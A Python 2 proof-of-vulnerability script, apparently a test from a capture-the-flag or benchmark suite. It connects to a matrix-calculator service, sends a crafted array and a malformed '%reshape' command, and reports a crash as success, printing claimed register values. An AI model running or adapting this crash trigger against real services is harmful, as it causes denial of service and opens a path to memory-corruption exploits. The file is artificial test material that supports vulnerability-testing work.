import sys
import socket
import os
import struct
import random

def readuntil( s, u ):
    z = ''

    while z.endswith( u ) == False:
        z += s.recv(1)

    return z

def readline( s ):
    return readuntil( s, '\n')

def eatprompt(s):
    return readuntil( s, '>>> ')

def main( argv ):
    if len(argv) == 3:
        HOST=argv[1]
        PORT=int(argv[2])
    else:
        if 'HOST' not in os.environ or 'PORT' not in os.environ:
            print '[ERROR] target and port must be specified via arguments or variables.'
            sys.exit(1)

        HOST=os.environ['HOST']
        PORT=int(os.environ['PORT'])

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        s.connect((HOST, PORT))
    except:
        print '[FAIL] Failed to connect to target %s:%d' %(HOST, PORT)
        sys.exit(1)

    print '[INFO] Connected to %s:%d' %(HOST, PORT)

    print 'RAX=0xdeadbeefcafebabf'
    print 'ST0=0x403edeadbeefcafebac0'
    
    eatprompt(s)

    ### init a larger file
    s.send('A = [ 16045690984503098046.0 16045690984503098046.0 16045690984503098046.0 16045690984503098047.0 16045690984503098048.0 16045690984503098046.0 16045690984503098047.0 ]\n')
    eatprompt(s)
    s.settimeout(5.0)

    s.send('B = %reshape(A, [1 1])\n')

    try:
        y = s.recv(4)

        if len(y) == 0:
            raise Exception('Read length was zero')
    except:
        print '[SUCCESS] Read failed which likely indicates a crash'
        s.close()

        sys.exit(0)

    print '[FAIL] Successfully read the prompt which means a crash did not occur'
    s.send('exit\n')
    s.close()

    sys.exit(1)

if __name__ == '__main__':
    main(sys.argv)
